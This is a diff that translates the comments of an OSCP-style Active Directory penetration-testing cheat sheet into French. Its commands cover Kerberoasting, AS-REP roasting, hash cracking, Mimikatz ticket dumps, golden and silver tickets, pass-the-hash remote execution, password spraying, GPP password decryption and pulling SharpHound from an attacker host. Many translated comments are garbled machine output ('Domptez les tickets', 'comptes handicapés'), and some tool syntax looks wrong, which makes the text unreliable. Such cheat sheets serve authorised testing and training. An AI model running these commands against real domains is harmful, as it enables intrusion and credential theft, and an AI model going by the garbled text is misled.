@@ -44,10 +44,10 @@ nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>
 <p class="oscp-command-note">Script shell dans la rubrique « Reconnaissance avec Nmap ».</p>
 
 ```bash
-# Using Kerbrute
+# Utilisation de Kerbrute
 ./kerbrute_linux_amd64 userenum -d [domain].com /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames
 
-# Using CrackMapExec
+# Utilisation de CrackMapExec
 crackmapexec smb [domain].com -u '' -p '' --users
 ```
 
@@ -55,10 +55,10 @@ crackmapexec smb [domain].com -u '' -p '' --users
 <p class="oscp-command-note">Commande Impacket dans la rubrique « Reconnaissance avec Nmap ».</p>
 
 ```bash
-# Using GetAdUsers.py (same tool)
+# Utilisation de GetAdUsers.py (même outil)
 impacket-GetADUsers -all -dc-ip <dc_ip> -u <username> -p <password> <domain>
 
-# Using Enum4Linux
+# Utilisation de Enum4Linux
 enum4linux -a -u "<username>" -p "<password>" <dc_ip>
 ```
 
@@ -139,13 +139,13 @@ Vérifier les ports et les services de la cible autorisée.
 <p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
 
 ```bash
-# Check for Kerberos service availability and get basic information
+# Vérifiez la disponibilité du service Kerberos et obtenez des informations de base
 nmap -p 88 --script kerberos-enum-users <target_ip>
 
-# Check for common Kerberos vulnerabilities
+# Vérifier les vulnérabilités communes de Kerberos
 nmap -p 88 --script kerberos-brute <target_ip>
 
-# Enumerate SPNs (Service Principal Names)
+# Énumérer les NSP (Noms principaux des services)
 nmap -p 88 --script krb5-enum-users,krb5-scan <target_ip>
 ```
 
@@ -153,7 +153,7 @@ nmap -p 88 --script krb5-enum-users,krb5-scan <target_ip>
 <p class="oscp-command-note">Examiner les comptes sans préauthentification Kerberos.</p>
 
 ```bash
-# This is the same tool as impacket-GetNPUsers.
+# C'est le même outil que l'impacket-GetNPUsers.
 GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc-ip> -format hashcat
 # Autre possibilité
 GetNPUsers.py <domain>/ -no-pass -usersfile <path_to_userlist> -dc-ip <domain_controller_ip>
@@ -219,10 +219,10 @@ python3 GetST.py -dc-ip <dc_ip> <domain>/<username>:<password> -spn <service>/<t
 <p class="oscp-command-note">Énumérer les SPN des comptes de service.</p>
 
 ```bash
-# Extract all service tickets for offline cracking
+# Extraire tous les tickets de service pour fissuration hors ligne
 impacket-GetUserSPNs -dc-ip <dc_ip> -outputfile <tickets_file> <domain>/<username>:<password>
 
-# Crack the extracted tickets with John the Ripper or Hashcat
+# Crack les billets extraits avec John l'Éventreur ou Hashcat
 john --wordlist=<wordlist> <tickets_file>
 # or
 hashcat -m 13100 <tickets_file> <wordlist>
@@ -252,7 +252,7 @@ rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
-# Dump Kerberos tickets from memory using Mimikatz
+# Domptez les tickets Kerberos de la mémoire en utilisant Mimikatz
 mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
 ```
 
@@ -260,7 +260,7 @@ mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
 <p class="oscp-command-note">Exécuter un script Python.</p>
 
 ```bash
-# Test for weak pre-authentication configurations
+# Essai de configurations de pré-authentification faibles
 python3 kerbrute.py -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>
 ```
 
@@ -268,7 +268,7 @@ python3 kerbrute.py -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>
 <p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>
 
 ```bash
-# Create a silver ticket with Rubeus
+# Créer un ticket argent avec Rubeus
 rubeus.exe tgt::add /user:<username> /rc4:<password> /sid:<domain_sid> /domain:<domain>
 ```
 
@@ -287,7 +287,7 @@ impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> 
 <p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>
 
 ```bash
-# Create a golden ticket with Rubeus
+# Créer un billet doré avec Rubeus
 rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<domain_sid> /rc4:<krbtgt_hash>
 ```
 
@@ -340,29 +340,29 @@ ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=group)" cn
 
 
 ```bash
-# Basic LDAP query
+# Demande LDAP de base
 ldapsearch -x -H ldap://<target_ip>
 
-# Basic LDAP Search for a base-level
+# LDAP de base Rechercher un niveau de base
 ldapsearch -h <target_ip> -x -s base
 
 # Afficher les contextes de nommage LDAP
 ldapsearch -x -H ldap://<target_ip> -s base namingcontexts
 
-# Search in a Specific Base Domain Name
+# Rechercher dans un nom de domaine de base spécifique
 ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>"
 
-# Enumerate users using LDAP
+# Énumérer les utilisateurs utilisant LDAP
 ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass=*)"
 
-# Retrieve users Account Name
+# Récupérer le nom de compte des utilisateurs
 ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass*)" | grep sAMAccountName:
 
-# Search with Filters
+# Rechercher avec les filtres
 ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=user)"
 ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=group)"
 
-# Searching with authentication
+# Recherche avec authentification
 ldapsearch -h <target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>"
 
 # Searching terms
@@ -383,99 +383,99 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 <p class="oscp-command-note">Script shell dans la rubrique « Énumération LDAP (ports 389 et 636) ».</p>
 
 ```bash
-# Search Terms to Find Cleartext Passwords
-# Search for ms-MCS-AdmPwd (local administrator passwords)
+# Termes de recherche pour trouver les mots de passe Cleartext
+# Rechercher ms-MCS-AdmPwd (mots de passe de l'administrateur local)
 (ms-MCS-AdmPwd=*)
 
-# Search for attributes containing 'password' in description
+# Rechercher les attributs contenant 'password' dans la description
 (description=*password*)
 
-# Search for LAPS expiration time (to identify potential password management)
+# Rechercher le délai d'expiration de LAPS (pour identifier la gestion de mot de passe potentielle)
 (ms-MCS-AdmPwdExpirationTime=*)
 
-# Search for common weak passwords in attributes like description
+# Rechercher des mots de passe faibles communs dans des attributs comme la description
 (description=*(123456*|password*|qwerty*|letmein*))
 
-# General LDAP Search Filters
-# Search for All Users
+# Général LDAP Filtres de recherche
+# Rechercher tous les utilisateurs
 (objectClass=user)
 
-# Search for All Computers
+# Rechercher tous les ordinateurs
 (objectClass=computer)
 
-# Search for All Groups
+# Rechercher tous les groupes
 (objectClass=group)
 
-# Search for Disabled Accounts
+# Recherche de comptes handicapés
 (userAccountControl:1.2.840.113556.1.4.803:=2)
 
-# Search for Expired Accounts
+# Recherche de comptes expirés
 (& (objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!(pwdLastSet=0)))
 
-# Search for Specific Group Membership
+# Rechercher un abonnement de groupe spécifique
 (&(objectClass=user)(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com))
 
-# Search for Users with Specific Attributes
-# For users with a specific email domain
+# Rechercher des utilisateurs avec des attributs spécifiques
+# Pour les utilisateurs ayant un domaine de messagerie spécifique
 (mail=*@example.com)
-# For users with a specific title
+# Pour les utilisateurs ayant un titre spécifique
 (title=Manager)
 
 # Specific Attributes
 
-# Search for Password Last Set
+# Recherche du dernier jeu de mots de passe
 (pwdLastSet=*)
 
-# Search for Accounts with Expired Passwords
+# Recherche de comptes avec mot de passe expiré
 (& (objectClass=user)(pwdLastSet<=0))
 
-# Search for Accounts in a Specific Organizational Unit (OU)
+# Recherche de comptes dans une unité organisationnelle spécifique (OU)
 (distinguishedName=*,OU=Sales,DC=domain,DC=com)
 
 # Security-Related Searches
 
-# Search for Accounts with Kerberos Pre-Authentication Disabled
+# Recherche de comptes avec Kerberos pré-authentification désactivée
 (userAccountControl:1.2.840.113556.1.4.803:=4194304)
 
-# Search for Service Principal Names (SPNs)
+# Recherche de noms principaux de services (SPN)
 (servicePrincipalName=*)
 
-# Search for Delegated Users
+# Recherche d'utilisateurs délégués
 (msDS-AllowedToDelegateTo=*)
 
-# Search for Accounts with Privileges
+# Rechercher des comptes avec des privilèges
 (memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)
 
 # Other Useful Searches
 
-# Search for All Organizational Units
+# Rechercher toutes les unités organisationnelles
 (objectClass=organizationalUnit)
 
-# Search for Active Directory Certificate Services
+# Recherche de services de certificat d'annuaire actif
 (objectClass=cACertificate)
 
-# Search for All Attributes of a Specific User
+# Rechercher tous les attributs d'un utilisateur spécifique
 (sAMAccountName=username)
 
-# Search for Accounts with Specific Notes or Descriptions
+# Recherche de comptes avec notes ou descriptions spécifiques
 (description=*keyword*)
 
-# Search for all objects in the directory
+# Rechercher tous les objets dans le répertoire
 (objectClass=*)
 
-# Search for service accounts
+# Recherche de comptes de service
 (objectCategory=serviceAccount)
 
-# Search for accounts with specific group memberships (replace 'GroupName')
+# Recherche de comptes avec des abonnements spécifiques de groupe (remplacer 'GroupName')
 (memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com)
 
-# Search for computer accounts
+# Recherche de comptes informatiques
 (objectClass=computer)
 
-# Search for users in a specific organizational unit (replace 'OU=Users')
+# Rechercher des utilisateurs dans une unité organisationnelle spécifique (remplacer 'OU=Users')
 (ou=OU=Users,DC=domain,DC=com)
 
-# Search for all accounts with specific attributes
+# Rechercher tous les comptes avec des attributs spécifiques
 (pwdLastSet=0)
 ```
 
@@ -495,7 +495,7 @@ nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-d
 # NetBIOS Scan
 sudo nbtscan -r 192.168.50.0/24
 
-# Windows Network View
+# Vue réseau Windows
 net view \\[domainName] /all
 ```
 
@@ -520,16 +520,16 @@ nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-
 <p class="oscp-command-note">Parcourir un partage SMB.</p>
 
 ```bash
-# Use smbclient or enum4linux to enumerate SMB shares.
+# Utilisez smbclient ou enum4linux pour énumérer les actions SMB.
 smbclient -L //<dc-ip> -U "guest"
 
-# List shares using CrackMapExec (CME).
+# Lister les actions en utilisant CrackMapExec (CME).
 crackmapexec smb <dc-ip> -u '' -p '' --shares
 ```
 
 
 ```bash
-# Perform null session enumeration to list domain users.
+# Effectuer un dénombrement de session nul pour lister les utilisateurs du domaine.
 rpcclient -U "" <dc-ip> --command="enumdomusers"
 
 # Or use CME for RID cycling.
@@ -540,10 +540,10 @@ crackmapexec smb <dc-ip> --rid-brute
 <p class="oscp-command-note">Script shell dans la rubrique « Énumération SMB (port 445) ».</p>
 
 ```bash
-# Network Packet Analysis: captures and analyzes packets related to SMB traffic on port 139, looking for specific patterns
+# Analyse des paquets réseau: capture et analyse les paquets liés au trafic SMB sur le port 139, à la recherche de modèles spécifiques
 sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
 
-# Lists available SMB shares on the target
+# Listes des actions SMB disponibles sur la cible
 smbclient -L <IP>
 ```
 
@@ -577,14 +577,14 @@ crackmapexec smb <IP> -u '[user]' -p '[password]'
 <p class="oscp-command-note">Examiner les informations SMB et du domaine.</p>
 
 ```bash
-# Basic information gathering on the domain
+# Collecte d'informations de base sur le domaine
 enum4linux -a <IP>
 enum4linux -a -u "" -p "" <IP> && enum4linux -a -u "guest" -p "" <IP>
 
-# Extract domain users
+# Extraire les utilisateurs du domaine
 enum4linux -U <DOMAIN_IP>
 
-# Extract available domain shares
+# Extraire les parts de domaine disponibles
 enum4linux -S <IP>
 
 enum4linux -a -M -l -d <ip> 2>&1
@@ -602,11 +602,11 @@ smbclient -N //<IP>/<SHARE>
 smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
 smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *" # Change the timeout to download big files
 
-# Change the timeout to download big files
+# Changer le timeout pour télécharger les gros fichiers
 help timeout
 timeout 100
 
-# Other commands
+# Autres commandes
 prompt off
 recurse on
 mget *
@@ -624,7 +624,7 @@ hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
 <p class="oscp-command-note">Créer un répertoire.</p>
 
 ```bash
-# Mounts SMB shares to a local directory for further access and manipulation.
+# Monte les parts de SMB dans un répertoire local pour plus d'accès et de manipulation.
 mkdir /tmp/share
 sudo mount -t cifs //<IP>/<SHARE> /tmp/share
 sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<IP>/<SHARE> /tmp/share
@@ -653,13 +653,13 @@ atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 
 
 ```bash
-# Credentials
+# Identifiants
 psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
 
-# Pass the Hash
+# Pass-the-Hash
 psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 
-# Testing with Crackmapexec
+# Vérification avec CrackMapExec
 crackmapexec smb <IP> -u <USER> -p <PASSWORD> --psexec
 crackmapexec smb <IP> -u <USER> -H <NTHASH> --psexec
 ```
@@ -668,13 +668,13 @@ crackmapexec smb <IP> -u <USER> -H <NTHASH> --psexec
 <p class="oscp-command-note">Exécuter une commande distante via WMI.</p>
 
 ```bash
-# Credentials
+# Identifiants
 wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
 
-# Pass the Hash
+# Pass-the-Hash
 wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 
-# Testing with Crackmapexec
+# Vérification avec CrackMapExec
 crackmapexec wmiexec <IP> -u <USER> -p <PASSWORD>
 crackmapexec wmiexec <IP> -u <USER> -H <NTHASH>
 ```
@@ -716,7 +716,7 @@ crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
 
 
 ```powershell
-# Using PowerShell to connect to WinRM
+# Utilisation de PowerShell pour se connecter à WinRM
 Enter-PSSession -ComputerName $IP -Credential (Get-Credential)
 ```
 
@@ -729,13 +729,13 @@ Enter-PSSession -ComputerName $IP -Credential (Get-Credential)
 <p class="oscp-command-note">Script PowerShell dans la rubrique « Énumération de base ».</p>
 
 ```powershell
-# Using PowerShell
+# Avec PowerShell
 (Get-ADDomain).DomainSID
 
-# Using CMD
+# Utilisation de CMD
 whoami /user
 
-# Using vmic
+# Utilisation de vmic
 wmic useraccount where name='[usernameToFind]' get sid
 ```
 
@@ -743,28 +743,28 @@ wmic useraccount where name='[usernameToFind]' get sid
 
 
 ```powershell
-# Using PowerShell
+# Avec PowerShell
 Get-ADDomainController -Filter *
 
-# Using nltest
+# Utilisation de nltest
 nltest /dclist:[YourDomainName]
 
-# Using netdom
+# Utilisation du netdom
 netdom query dc
 
-# Using nslookup
+# Utilisation de nslookup
 nslookup yourdomain.com
 
-# Using ADUC
-# Open ADUC --> In the Domain Controllers Organizational Unit (OU), you can find the domain controllers listed there.
+# Utilisation de ADUC
+# Ouvrir ADUC --> Dans l'unité organisationnelle des contrôleurs de domaine (OU), vous pouvez trouver les contrôleurs de domaine répertoriés là.
 ```
 
 
 ```powershell
-# Using PowerShell
-# List All User Accounts with Service Principal Names (SPNs)
+# Avec PowerShell
+# Lister tous les comptes utilisateurs avec les noms principaux de service (SPN)
 Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
-# Find Specific Service Accounts (e.g., SQL Server)
+# Trouver des comptes de service spécifiques (p. ex., serveur SQL)
 Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
 
 # Checking Running Services
@@ -772,13 +772,13 @@ Get-WmiObject -Class Win32_Service | Where-Object { $_.StartName -ne "LocalSyste
 # Autre possibilité
 sc queryex type= service
 
-# Using nltest
+# Utilisation de nltest
 nltest /domain_trusts
 
-# Identify Specific Service Account by SPN
+# Identifier un compte de service spécifique par SPN
 Get-ADServiceAccount -Filter * | Select-Object Name, ServicePrincipalNames
 
-# Using ADUC
+# Utilisation de ADUC
 Open Active Directory Users and Computers and enable Advanced Features under the View menu. Browse to find service accounts.
 ```
 
@@ -945,7 +945,7 @@ Get-NetUser -Delegation
 ```
 
 
-## Service Principal Names (SPN) Énumération
+## Noms principaux de service (SPN) Inventaire
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -1038,10 +1038,10 @@ Examiner les objets, les droits et les services du domaine.
 <p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
 
 ```powershell
-# Download the PowerShell version of SharpHound
+# Télécharger la version PowerShell de SharpHound
 Invoke-WebRequest -Uri "http://[attacker_ip]/sharphound.ps1" -OutFile "C:\Temp\sharphound.ps1"
 
-# Alternatively, you can download the .exe version
+# Vous pouvez également télécharger la version .exe
 Invoke-WebRequest -Uri "http://[attacker_ip]/sharphound.exe" -OutFile "C:\Temp\sharphound.exe"
 ```
 
@@ -1049,12 +1049,12 @@ Invoke-WebRequest -Uri "http://[attacker_ip]/sharphound.exe" -OutFile "C:\Temp\s
 <p class="oscp-command-note">Script PowerShell dans la rubrique « BloodHound &amp; SharpHound ».</p>
 
 ```powershell
-# Find your domain name
+# Trouvez votre nom de domaine
 nltest /dclist:domainname
 # Autre possibilité
 Get-ADDomainController -Discover
 
-# Run SharpHound to collect domain data (using the .exe)
+# Exécuter SharpHound pour collecter des données de domaine (en utilisant le .exe)
 .\SharpHound.exe -c All
 # Autre possibilité
 .\SharpHound.exe -c All -d <domain> -u <username> -p <password> -f AllData
@@ -1064,10 +1064,10 @@ Get-ADDomainController -Discover
 <p class="oscp-command-note">Charger un module PowerShell.</p>
 
 ```powershell
-# Import the SharpHound script into memory
+# Importer le script SharpHound dans la mémoire
 Import-Module .\SharpHound.ps1
 
-# Collect all data from the domain
+# Recueillir toutes les données du domaine
 Invoke-BloodHound -CollectionMethod All -Domain <domain> -OutputDirectory C:\Temp
 ```
 
@@ -1097,10 +1097,10 @@ Invoke-BloodHound -CollectionMethod ACL
 # Having an Evil-WinRM session
 download [bloodhound_file].zip
 
-# SCP from the victim to your Kali
+# SCP de la victime à votre Kali
 scp user@victim-ip:C:\Temp\*.zip /path/to/your/dir
 
-# Download via a web server
+# Télécharger via un serveur web
 Invoke-WebRequest -Uri "http://your-kali-ip/upload/path" -OutFile "C:\Temp\*.zip"
 ```
 
@@ -1112,7 +1112,7 @@ Invoke-WebRequest -Uri "http://your-kali-ip/upload/path" -OutFile "C:\Temp\*.zip
 
 
 ```bash
-# Start the Neo4j service in Kali (needed for analyzing the collected data):
+# Démarrer le service Neo4j à Kali (nécessaire pour analyser les données collectées):
 sudo neo4j start
 ```
 
@@ -1196,7 +1196,7 @@ hashcat -m 1000 ntlm-hashes.txt rockyou.txt
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Many more commands can be found in the Section 6.
+# De nombreuses autres commandes se trouvent dans la Section 6.
 crackmapexec smb <dc-ip> -u usernames.txt -p password123 --spray
 ```
 
@@ -1393,7 +1393,7 @@ type Groups.xml
 ```bash
 gpp-decrypt [gpp_hash/cpassword]
 
-# Example
+# Exemple
 gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
 sup3r53cr3tGP0pa55
 ```
@@ -1402,10 +1402,10 @@ sup3r53cr3tGP0pa55
 <p class="oscp-command-note">Lister les fichiers du répertoire.</p>
 
 ```bash
-# Check for cpassword in the SYSvol share to obtain cleartext passwords in XML files.
+# Vérifiez le mot de passe cpass dans le partage SYSvol pour obtenir des mots de passe clairs dans les fichiers XML.
 dir \\\\<domain>\\SYSVOL\\<domain>\\Policies\\ /s /b | findstr cpassword
 
-# Look for Groups.xml files which might contain cleartext passwords.
+# Recherchez les fichiers Groups.xml qui peuvent contenir des mots de passe clairs.
 smbclient //dc-ip/SYSVOL -U "domain\username"
 ```
 
@@ -1449,7 +1449,7 @@ Examiner les objets, les droits et les services du domaine.
 
 
 ```bash
-# Reference to a script for downloading files in SYSVOL
+# Référence à un script pour télécharger des fichiers dans SYSVOL
 https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
 ```
 
@@ -1490,7 +1490,7 @@ Vérifier les ports et les services de la cible autorisée.
 ```powershell
 powershell -ExecutionPolicy Bypass
 
-# Use any of the following options
+# Utilisez l'une des options suivantes
 Import-Module .\adPEAS.ps1
 
 . .\adPEAS.ps1
@@ -1647,7 +1647,7 @@ Find Principals with Unusual Rights on Password Attributes
 ```
 
 
-### GMSA Password Retrieval with GMSAPasswordReader
+### Récupération de mot de passe GMSA avec GMSAMot de passeReader
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -1668,9 +1668,9 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 ```powershell
 .\GMSAPasswordReader.exe --AccountName [GMSA_ACCOUNT_NAME]
 
-# Example
+# Exemple
 .\GMSAPasswordReader.exe --accountname 'svc_apache'
-# This will return probably an rc4_hmac (not the Old Value), which is the same as an NTLM hash, so we can try to crack it (hashcat -m 1000 '[ntlm_hash]' [wordlist]) or do a pass the hash, don't forget the '$' for the username if it is a service account (evil-winrm -i [ip] -u svc_apache$ -H [ntlm_hash]).
+# Cela retournera probablement un rc4 hmac (pas l'ancienne valeur), qui est le même qu'un hash NTLM, donc nous pouvons essayer de le fissurer (hashcat -m 1000 '[ntlm_hash]' [wordlist]) ou faire un pass le hash, n'oubliez pas le '$' pour le nom d'utilisateur s'il s'agit d'un compte de service (evil-winrm -i [ip] -u svc apache$ -H [ntlm_hash]).
 ```
 
 
@@ -1681,7 +1681,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `msDS-ManagedPassword`  
 
 
-### Alternative Commandes
+### Commandes alternatives
 
 
 **Paramètres et repères :**
@@ -1691,7 +1691,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 <p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
-# Find all gMSA accounts
+# Trouver tous les comptes gMSA
 Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"} -Properties msDS-ManagedPassword
 ```
 
@@ -1725,7 +1725,7 @@ ldapsearch -x -H ldap://<domain_controller> -D "<user>@<domain>" -w "<password>"
 
 
 ```powershell
-# List gMSA accounts with PowerView
+# Liste des comptes gMSA avec PowerView
 Get-DomainGMSA -Properties msDS-ManagedPassword
 ```
 
@@ -1817,7 +1817,7 @@ gpupdate /force
 Examiner les objets, les droits et les services du domaine.
 
 
-### Using Enum4linux
+### Utilisation de Enum4linux
 
 Examiner les permissions et la configuration de Linux.
 
@@ -1844,7 +1844,7 @@ enum4linux -a <DOMAIN_IP> > domain_enum.txt
 ```
 
 
-### Using CrackMapExec
+### Utilisation de CrackMapExec
 
 
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
@@ -1874,7 +1874,7 @@ crackmapexec ldap <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> -d [domain
 ```
 
 
-### Using Ldapsearch
+### Utilisation de Ldapsearch
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -1901,7 +1901,7 @@ ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWO
 ```
 
 
-### Using Rpcclient
+### Utilisation de Rpcclient
 
 
 <p class="oscp-command-note">Examiner les objets exposés par RPC.</p>
@@ -1931,7 +1931,7 @@ rpcclient $> querydominfo
 ```
 
 
-### Using Smbclient
+### Utilisation de Smbclient
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -1953,7 +1953,7 @@ smbclient //<DOMAIN_IP>/SYSVOL -U <VALID_USERNAME>%<VALID_PASSWORD> -c "get impo
 ```
 
 
-### Using BloodHound (SharpHound)
+### Utilisation de BloodHound (SharpHound)
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -1969,7 +1969,7 @@ SharpHound.exe -c All -d [domain].com -u <VALID_USERNAME> -p <VALID_PASSWORD> -d
 ```
 
 
-### Using Nmap
+### Utilisation de Nmap
 
 Vérifier les ports et les services de la cible autorisée.
 
@@ -1993,7 +1993,7 @@ nmap --script ldap-search -p389 <DOMAIN_IP>
 ```
 
 
-### Using Kerbrute
+### Utilisation de Kerbrute
 
 
 <p class="oscp-command-note">Examiner les comptes Kerberos du domaine.</p>
@@ -2009,7 +2009,7 @@ kerbrute passwordspray --dc <DOMAIN_IP> -d [domain].com userlist.txt <PASSWORD>
 ```
 
 
-### Using PowerShell (if allowed)
+### Utilisation de PowerShell (si autorisé)
 
 Observer les permissions et la configuration de Windows.
 
@@ -2064,16 +2064,16 @@ smbclient //<DOMAIN_IP>/<SHARE> -U <USERNAME>
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Enumerate valid users and their privileges
+# Énumérer les utilisateurs valides et leurs privilèges
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --users
 
-# Check for users with admin privileges
+# Vérifiez pour les utilisateurs avec les privilèges d'administration
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --admin
 
-# Enumerate users with valid credentials (password)
+# Énumérer les utilisateurs avec des identifiants valides (mot de passe)
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --users -d <DOMAIN_NAME>
 
-# Enumerate users with valid NTLM hash
+# Énumérer les utilisateurs avec un hachage NTLM valide
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --users -d <DOMAIN_NAME>
 ```
 
@@ -2084,13 +2084,13 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --users -d <DOMAIN_NAM
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Enumerate accessible shares with provided credentials
+# Énumérer les parts accessibles avec les références fournies
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares
 
-# List accessible shares using a password
+# Lister les actions accessibles en utilisant un mot de passe
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares -d <DOMAIN_NAME>
 
-# List accessible shares using an NTLM hash
+# Lister les actions accessibles en utilisant un hachage NTLM
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --shares -d <DOMAIN_NAME>
 ```
 
@@ -2101,10 +2101,10 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --shares -d <DOMAIN_NA
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# List groups in the domain
+# Liste des groupes dans le domaine
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --groups -d <DOMAIN_NAME>
 
-# With NTLM hash
+# Avec hachage NTLM
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --groups -d <DOMAIN_NAME>
 ```
 
@@ -2115,7 +2115,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --groups -d <DOMAIN_NA
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Check domain password policies
+# Vérifiez les politiques de mot de passe de domaine
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --pass-pol -d <DOMAIN_NAME>
 ```
 
@@ -2126,7 +2126,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --pass-pol -d <DOMAIN_N
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# List users and shares on a local machine
+# Lister les utilisateurs et les parts sur une machine locale
 crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> --users --shares --local-auth
 ```
 
@@ -2155,10 +2155,10 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# List databases
+# Liste des bases de données
 crackmapexec mssql <TARGET_IP> -u <USERNAME> -p <PASSWORD> --dbs
 
-# Execute SQL queries
+# Exécuter les requêtes SQL
 crackmapexec mssql <TARGET_IP> -u <USERNAME> -p <PASSWORD> -q "SELECT name FROM master.dbo.sysdatabases"
 ```
 
